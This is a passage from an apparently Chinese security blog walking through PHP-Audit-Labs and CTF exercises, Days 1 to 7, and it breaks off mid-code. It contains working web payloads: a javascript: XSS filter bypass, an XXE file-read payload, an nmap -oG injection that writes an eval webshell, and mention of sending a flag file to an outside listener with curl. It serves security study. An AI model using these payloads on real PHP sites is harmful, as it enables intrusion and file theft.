title="Da4er"><p>在index.php页面，发现使用了in_array函数，但是没有加以限制，这就会造成这个函数的检测形如虚设。我们只需绕过stop_hack即可。<br>检查正则表达式发现没有过滤报错函数，我们可以进行报错注入得到flag。</p><hr><h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h4 id="filter-var函数缺陷"><a href="#filter-var函数缺陷" class="headerlink" title="filter_var函数缺陷"></a>filter_var函数缺陷</h4><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/13.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/14.png" class title="Da4er"><p>当第二个参数设置为上图的值，会检测第一个参数是否为正确的url。<br>这里是可以绕过的，一般可以使用：javascript:// file:// test://等绕过。<br>注意：javascript:// 中的//是注释符，当我们使用这个弹框时可以使用如下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">javascript:&#x2F;&#x2F;comment％250aalert(1)</span><br><span class="line">其中的%250a&#x3D;&gt;%0a 是换行符的意思。</span><br></pre></td></tr></table></figure><p>测试代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/15.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/16.png" class title="Da4er"><p>发现这是可以绕过的。</p><h4 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a>防御措施</h4><p>不光要使用filter_var进行过滤，还要使用其他的过滤的措施。<br>如下图，xss防御措施：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/17.png" class title="Da4er"><h4 id="CTF-Docker-题目-1"><a href="#CTF-Docker-题目-1" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h4><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/18.png" class title="Da4er"><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;||sec-redclub.com</span><br></pre></td></tr></table></figure><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/19.png" class title="Da4er"><hr><h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><h3 id="实例化任意对象漏洞"><a href="#实例化任意对象漏洞" class="headerlink" title="实例化任意对象漏洞"></a>实例化任意对象漏洞</h3><p><strong>实列化对象漏洞是:用户可以输入一个参数，作为对象名，输入任意个参数，作为对象的参数。如果没有对用户输入做严格限制就会导致这个漏洞。</strong><br>直接拿CTF题来演示，用到的函数如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/20.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/21.png" class title="Da4er"><p>题目如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class NotFound</span><br><span class="line">&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        die(&#39;404&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spl_autoload_register(</span><br><span class="line">    function ($class) &#123;</span><br><span class="line">        new NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$classname &#x3D; isset($_GET[&#39;name&#39;]) ? $_GET[&#39;name&#39;] : null;</span><br><span class="line">$param &#x3D; isset($_GET[&#39;param&#39;]) ? $_GET[&#39;param&#39;] : null;</span><br><span class="line">$param2 &#x3D; isset($_GET[&#39;param2&#39;]) ? $_GET[&#39;param2&#39;] : null;</span><br><span class="line">if (class_exists($classname)) &#123;</span><br><span class="line">    $newclass &#x3D; new $classname($param, $param2);</span><br><span class="line">    var_dump($newclass);</span><br><span class="line">    foreach ($newclass as $key &#x3D;&gt; $value)</span><br><span class="line">        echo $key . &#39;&#x3D;&gt;&#39; . $value . &#39;&lt;br&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>class_exists 函数来判断类是否存在，如果不存在的话，就会调用程序中的 __autoload 函数，但是这里没有 __autoload 函数，而是用 spl_autoload_register 注册了一个类似 __autoload 作用的函数，即这里输出404信息。<br>这个发现没有对用户输入进行限制，可以造成xxe任意文件读取漏洞。</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/22.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/23.png" class title="Da4er"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;GlobIterator&amp;param&#x3D;.&#x2F;*.php&amp;param2&#x3D;0</span><br></pre></td></tr></table></figure><p>最后payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;G:&#x2F;PHPstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;flag.txt&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt;&amp;param2&#x3D;2</span><br></pre></td></tr></table></figure><p>这里注意的是：读取文件要使用php伪协议，因为：当文件中存在： &lt; &gt; &amp; ‘ “ 这5个符号时，会导致XML文件解析错误。<br>最后成功读取到文件。</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/24.png" class title="Da4er"><hr><h2 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h2><h3 id="strpos使用不当引发漏洞"><a href="#strpos使用不当引发漏洞" class="headerlink" title="strpos使用不当引发漏洞"></a>strpos使用不当引发漏洞</h3><p>说是strpos函数，其实就是程序员对一些php漏洞点理解不当而造成的。</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/25.png" class title="Da4er"><p>实列代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/26.png" class title="Da4er"><p>看到第8，9行，通过strpos函数检测$user和pass是否包含&lt;&gt;，但是这个有个忽略点：false 和 0 的取反均为 true 。<br>所以如果我们让$user或$pass开头包含&lt;，则返回的是true。<br>我们通过实列测试一下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/27.png" class title="Da4er"><p>发现即使字符串中包含&lt;&gt;也是可以进入判断体的，这就造成了绕过。</p><p>其实不光strpos函数，==号也存在这样的问题，==号出现的问题叫做弱类型比较。因为==号在比较时会先转换成相同的类型在比较，这就造成了绕过。<br>实列代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/28.png" class title="Da4er"><hr><h2 id="Day5"><a href="#Day5" class="headerlink" title="Day5"></a>Day5</h2><h3 id="escapeshellcmd与escapeshellarg"><a href="#escapeshellcmd与escapeshellarg" class="headerlink" title="escapeshellcmd与escapeshellarg"></a>escapeshellcmd与escapeshellarg</h3><p>作用范围：Linux<br>两个函数作用如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/29.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/30.png" class title="Da4er"><p>实列代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Create By Da4er.</span><br><span class="line"> *&#x2F;</span><br><span class="line">$shell_string &#x3D; &quot;&#39;&lt;?php phpinfo() ?&gt; -oG hack.php&#39;&quot;;</span><br><span class="line">$shell1 &#x3D; escapeshellarg($shell_string);</span><br><span class="line">$shell2 &#x3D; escapeshellcmd($shell1);</span><br><span class="line">echo $shell1.&quot;\n&quot;;</span><br><span class="line">echo $shell2.&quot;\n&quot;;</span><br></pre></td></tr></table></figure><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/31.png" class title="Da4er"><p>根据运行结果看出：先将字符串经过escapeshellarg转换成shell能识别的字符，在用escapeshellcmd对字符串进行转义，可以造成字符逃逸执行特殊命令。<br>官方解释如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/32.png" class title="Da4er"><h3 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h3><h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/33.png" class title="Da4er"><p>题目对host参数用上述两个函数进行了过滤，可以逃逸出去。在结合nmap的命令可以写入shell到网站。<br>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</span><br></pre></td></tr></table></figure><p>-oG参数可以将前面的一句话写到hack.php中。</p><h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><p>题目如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;index.php&#39;);</span><br><span class="line">function waf($a)&#123;</span><br><span class="line">    foreach($a as $key &#x3D;&gt; $value)&#123;</span><br><span class="line">        if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123;</span><br><span class="line">            exit(&#39;are you a hacker&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;</span><br><span class="line">    if($$__R) &#123; </span><br><span class="line">        foreach($$__R as $__k &#x3D;&gt; $__v) &#123; </span><br><span class="line">            if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if($_POST) &#123; waf($_POST);&#125;</span><br><span class="line">if($_GET) &#123; waf($_GET); &#125;</span><br><span class="line">if($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line">if($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">if($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">if(isset($_GET[&#39;flag&#39;]))&#123;</span><br><span class="line">    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;hongri&#39;])&#123;</span><br><span class="line">        exit(&#39;error&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(md5($_GET[&#39;flag&#39;] ) &#x3D;&#x3D; md5($_GET[&#39;hongri&#39;]))&#123;</span><br><span class="line">        $url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">        $urlInfo &#x3D; parse_url($url);</span><br><span class="line">        if(!(&quot;http&quot; &#x3D;&#x3D;&#x3D; strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;&#x3D;&#x3D;&#x3D;strtolower($urlInfo[&quot;scheme&quot;])))&#123;</span><br><span class="line">            die( &quot;scheme error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $url &#x3D; escapeshellarg($url);</span><br><span class="line">        $url &#x3D; escapeshellcmd($url);</span><br><span class="line">        system(&quot;curl &quot;.$url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这道题目不光考了两个函数的作用，也考了变量覆盖和md5弱类型比较。<br>首先看变量覆盖的知识点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function waf($a)&#123;</span><br><span class="line">    foreach($a as $key &#x3D;&gt; $value)&#123;</span><br><span class="line">        if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123;</span><br><span class="line">            exit(&#39;are you a hacker&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;</span><br><span class="line">    if($$__R) &#123; </span><br><span class="line">        foreach($$__R as $__k &#x3D;&gt; $__v) &#123; </span><br><span class="line">            if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if($_POST) &#123; waf($_POST);&#125;</span><br><span class="line">if($_GET) &#123; waf($_GET); &#125;</span><br><span class="line">if($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line">if($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">if($_GET) extract($_GET, EXTR_SKIP);</span><br></pre></td></tr></table></figure><p>这段代码通过一个waf函数将get，post，cookie传进去的参数的参数名不能包含flag，如果这道题是判断的值不能不包含flag的话，直接使用数组绕过即可，但是判断的是参数名，我们还需要另想办法，最后发现倒数一二行有个extract函数，可以变量覆盖。但是设置了EXTP_SKIP参数，表示如果前面存在参数就不进行变量覆盖，最后看一下这个很关键的数组。这个数组的逻辑是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$__R如果存在，就循环遍历_POST,_GET,_COOKIE的键名和值，如果相等，就会unset变量。</span><br></pre></td></tr></table></figure><p>那么绕过就可以从这个开始：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先通过get传递flag&#x3D;test，通过post传递_GET[flag]。则$$__就是$_GET[flag]，$__v为test，即可消除变量。但是在最后有个extract函数，有会在创建一个$_GET[flag]&#x3D;test从而绕过waf函数。</span><br></pre></td></tr></table></figure><p>md5弱类型比较好绕过这里不在说明。<br>最后就是escapeshellarg和 escapeshellcmd的绕过，关键在于一句话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">escapeshellcmd ，会对以下的字符进行转义&amp;#;|*?~&lt;&gt;^()[]&#123;&#125;$, x0A 和 xFF, &#39; 和 &quot;仅在不配对儿的时候被转义。</span><br></pre></td></tr></table></figure><p>将不匹配的’和”转义，说明我们在传入的参数中添加个单引号即可绕过。<br>最后就是curl如何读取flag.php文件了，这里我们可以设置个vps监听，然后通过-F参数上传本地的flag.php到一个网站，这里拿百度为例，payload如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/34.png" class title="Da4er"><p>这里我没有复现成功，因为要想这么使用对curl的版本也是有要求的，最后附上wp的说明。</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/35.png" class title="Da4er"><hr><h2 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h2><h3 id="正则使用不当导致的路径穿越问题"><a href="#正则使用不当导致的路径穿越问题" class="headerlink" title="正则使用不当导致的路径穿越问题"></a>正则使用不当导致的路径穿越问题</h3><p>看题目给的实列：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/36.png" class title="Da4er"><p>在第20行unlink函数之前没有对传入的$file变量进行过滤，导致我们可以进行目录穿越来删除任意文件。<br>看官方给的说明：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/37.png" class title="Da4er"><h3 id="CTF-Docker-题目-2"><a href="#CTF-Docker-题目-2" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h3><p>题目如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if  (&quot;POST&quot; &#x3D;&#x3D; $_SERVER[&#39;REQUEST_METHOD&#39;])</span><br><span class="line">&#123;</span><br><span class="line">    $password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">    if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;$&#x2F;&#39;, $password))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#39;Wrong Format&#39;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    while (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        $reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;;</span><br><span class="line">        if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">            break;</span><br><span class="line">        $c &#x3D; 0;</span><br><span class="line">        $ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;);</span><br><span class="line">        foreach ($ps as $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password))</span><br><span class="line">            $c +&#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($c &lt; 3) break;</span><br><span class="line">        if (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag;</span><br><span class="line">        else echo &#39;Wrong password&#39;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在本地进行转换代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Create By Da4er.</span><br><span class="line"> *&#x2F;</span><br><span class="line">$password &#x3D;@$_POST[&#39;password&#39;];</span><br><span class="line">if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;$&#x2F;&#39;, $password))</span><br><span class="line">&#123;</span><br><span class="line">    echo &#39;Wrong Format&#39;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;;</span><br><span class="line">    if (6 &gt; preg_match_all($reg, $password, $arr))&#123;</span><br><span class="line">        echo &#39;wrong&#39;;</span><br><span class="line">        echo preg_match_all($reg, $password, $arr);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo 1111;</span><br><span class="line">        $c &#x3D; 0;</span><br><span class="line">        $ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;);</span><br><span class="line">        foreach ($ps as $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password))</span><br><span class="line">                $c +&#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($c &lt; 3)&#123;</span><br><span class="line">            echo &quot;da4er&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo 2222;</span><br><span class="line">            if (&quot;42&quot; &#x3D;&#x3D; $password)&#123;</span><br><span class="line">                echo &quot;true&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &quot;false&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/43.png" class title="Da4er"><p>经过了三次正则判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一.判断password变量里面有12个或12个以上的可打印字符</span><br><span class="line">二.password变量的打印字符，十进制数，小写字母，大写字母大于等于6</span><br><span class="line">三.匹配password中的字符，十进制数，小写字母，大写字母，如果匹配到$c变量加一</span><br></pre></td></tr></table></figure><p>经过上面的逻辑判断，payload如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/39.png" class title="Da4er"><p>即可绕过正则。<br>这里需要注意：<strong>弱类型比较漏洞，必须要进行类型转换，像本题的最后一个就是弱类型比较，进绕过时传入的password变量必须是int类型（一个小坑）</strong></p><h2 id="Day7"><a href="#Day7" class="headerlink" title="Day7"></a>Day7</h2><h3 id="parse-str引起的变量覆盖"><a href="#parse-str引起的变量覆盖" class="headerlink" title="parse_str引起的变量覆盖"></a>parse_str引起的变量覆盖</h3><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/44.png" class title="Da4er"><p>测试代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/45.png" class title="Da4er"><h3 id="CTF-Docker-题目-3"><a href="#CTF-Docker-题目-3" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h3><p>题目如下：<br><strong>index.php</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;hongri&quot;;</span><br><span class="line">echo $a;</span><br><span class="line">$id &#x3D; @$_GET[&#39;id&#39;];</span><br><span class="line">@parse_str($id);</span><br><span class="line">if ($a[0] !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; md5($a[0]) &#x3D;&#x3D; md5(&#39;QNKCDZO&#39;)) &#123;</span><br><span class="line">    echo &#39;&lt;a href&#x3D;&quot;uploadsomething.php&quot;&gt;flag is here&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo $a[0];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>uploadsoming.php</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$referer &#x3D; $_SERVER[&#39;HTTP_REFERER&#39;];</span><br><span class="line">if(isset($referer)!&#x3D;&#x3D; false) &#123;</span><br><span class="line">    $savepath &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;&#x2F;&quot;;</span><br><span class="line">    if (!is_dir($savepath)) &#123;</span><br><span class="line">        $oldmask &#x3D; umask(0);</span><br><span class="line">        mkdir($savepath, 0777);</span><br><span class="line">        umask($oldmask);</span><br><span class="line">    &#125;</span><br><span class="line">    if ((@$_GET[&#39;filename&#39;]) &amp;&amp; (@$_GET[&#39;content&#39;])) &#123;</span><br><span class="line">        &#x2F;&#x2F;$fp &#x3D; fopen(&quot;$savepath&quot;.$_GET[&#39;filename&#39;], 